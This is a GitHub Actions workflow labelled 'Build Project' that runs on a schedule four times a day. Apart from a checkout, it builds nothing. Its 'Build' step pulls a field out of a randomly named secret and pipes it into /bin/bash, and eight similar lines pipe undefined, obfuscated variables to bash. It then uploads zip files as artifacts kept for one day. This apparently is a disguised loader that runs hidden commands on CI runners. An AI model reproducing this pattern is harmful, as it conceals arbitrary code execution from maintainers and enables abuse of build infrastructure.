name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '36 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  operation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build
        env:
          og5758: ${{ secrets.og5758 }}
        run: |
          printf '%s' "$og5758" | jq -r .qffc838 | /bin/bash
          echo $fkk05333 | jq -r .ny26 | /bin/bash
          printf '%s' "$np63512" | jq -r .gihn616 | /bin/bash
          printf '%s' "$yumob12799" | jq -r .nkwed512 | /bin/bash
          echo $p310 | jq -r .ycxzp19 | /bin/bash
          echo $kqn25776 | jq -r .ncat2 | /bin/bash
          echo $u2 | jq -r .xfry74 | /bin/bash
          echo $u4 | jq -r .rt104 | /bin/bash
          echo $t2295 | jq -r .d2474 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: FProWAmM
          path: "*.zip"
          retention-days: 1
